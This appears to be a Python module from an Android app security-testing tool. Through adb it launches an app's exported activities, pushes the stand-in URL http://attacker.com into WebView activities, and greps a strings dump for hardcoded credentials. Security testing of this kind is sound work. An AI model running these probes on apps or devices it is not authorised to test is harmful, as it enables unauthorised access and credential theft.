import os
import re
import subprocess
from utils import logger

def find_hardcoded_credentials(strings_file):
    credentials = []
    try:
        with open(strings_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            for line in lines:
                if re.search(r'(user(name)?|pass(word)?|auth|token)[=: ]', line, re.IGNORECASE):
                    credentials.append(line.strip())
    except Exception as e:
        logger.error(f"Error reading strings file: {e}")
    return credentials

def exploit_exported_components(package_name, exported_components, output_lines):
    for component in exported_components:
        logger.info(f"Attempting to start exported component: {component}")
        try:
            subprocess.run(["adb", "shell", "am", "start", "-n", f"{package_name}/{component}"], check=True)
            output_lines.append(f"[Exploit Attempt] Started exported component: {component}")
        except subprocess.CalledProcessError as e:
            output_lines.append(f"[Exploit Failed] {component}: {e}")

def exploit_webview_activities(package_name, webview_components, output_lines):
    malicious_url = "http://attacker.com"
    for component in webview_components:
        logger.info(f"Attempting WebView URL load on {component}")
        try:
            subprocess.run([
                "adb", "shell", "am", "start", "-n", f"{package_name}/{component}",
                "-d", malicious_url
            ], check=True)
            output_lines.append(f"[Exploit Attempt] WebView URL load: {component} -> {malicious_url}")
        except subprocess.CalledProcessError as e:
            output_lines.append(f"[Exploit Failed] WebView {component}: {e}")

def save_exploit_results(output_file, results):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    with open(output_file, 'w', encoding='utf-8') as f:
        for line in results:
            f.write(line + "\n")

def run_exploit(package_name, strings_file, exported_components, webview_components):
    logger.info("Starting exploitation attempts...")
    results = []

    # 1. Try exploiting exported components
    if exported_components:
        exploit_exported_components(package_name, exported_components, results)

    # 2. Try exploiting WebView URL loads
    if webview_components:
        exploit_webview_activities(package_name, webview_components, results)

    # 3. Check for hardcoded credentials
    credentials = find_hardcoded_credentials(strings_file)
    if credentials:
        results.append("Possible hardcoded credentials found:")
        results.extend(credentials)
    else:
        results.append("No hardcoded credentials found.")

    # Save results to file
    output_dir = os.path.join("output", "exploits")
    output_file = os.path.join(output_dir, f"{package_name}_results.txt")
    save_exploit_results(output_file, results)

    logger.info(f"Exploit results saved to {output_file}")

# Example usage (called from main.py)
# run_exploit(package_name, strings_file, exported_components, webview_components)
